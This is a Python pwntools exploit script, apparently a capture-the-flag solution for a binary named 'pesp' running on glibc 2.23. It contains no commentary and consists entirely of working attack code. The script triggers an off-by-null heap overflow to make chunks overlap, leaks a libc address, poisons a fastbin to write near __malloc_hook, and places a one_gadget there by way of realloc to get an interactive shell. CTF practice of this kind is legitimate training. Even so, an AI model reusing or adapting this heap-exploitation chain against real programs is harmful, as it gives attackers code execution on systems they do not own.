# -*- coding: utf-8 -*-

from pwn import*
from time import sleep
context.binary = "./pesp"
elf = context.binary
libc = ELF("./libc-2.23.so")
one_gadget = 0x4527a

def show():
    io.sendlineafter("choice:","1")

def add(length,cont):
    io.sendlineafter("choice:","2")
    io.sendlineafter(":",str(length))
    io.sendafter(":",cont)
    sleep(0.01)

def edit(idx,length,cont):
    io.sendlineafter("choice:","3")
    io.sendlineafter(":",str(idx))
    io.sendlineafter(":",str(length))
    io.sendafter(":",cont)
    sleep(0.01)

def delete(idx):
    io.sendlineafter("choice:","4")
    io.sendlineafter(":",str(idx))

io = process("./pesp")



add(0xf0,'0'*0xf0)
add(0x68,'1'*0x68)#trigger 0ff-by-null
add(0xf0,'2'*0xf0)
add(0x10,'3'*0x10)

delete(0)
edit(1,0x68,flat('1'*0x60,0x170))
delete(2)
add(0xf0,'x'*0x10)
show()

libc_address = u64(io.recvuntil("\x7f")[-6: ]+'\0\0')-0x3c4b78
print("libc @ {:#x}".format(libc_address))
#assert libc.address & 0xfff = 0


add(0x160,'4'*0x160)

add(0xf0,'a'*0xf0)
add(0x68,'b'*0x68)
add(0xf0,'c'*0xf0)
add(0x10,'d'*0x10)

delete(4)
edit(5,0x68,flat('b'*0x60,0x170))

delete(6)
delete(5)

add(0x120,flat('A'*0xf8,0x70,(libc_address+0x3c4aed)))
add(0x68,'x'*0x10)
add(0x68,flat('\0'*11,(libc_address+one_gadget),(libc_address+16+libc.sym["__libc_realloc"])))

#io.sendlineafter("choice:","2")
#io.sendlineafter(":",str(0xff))

io.sendlineafter("choice:","2")
io.sendlineafter(":","20")


io.interactive()
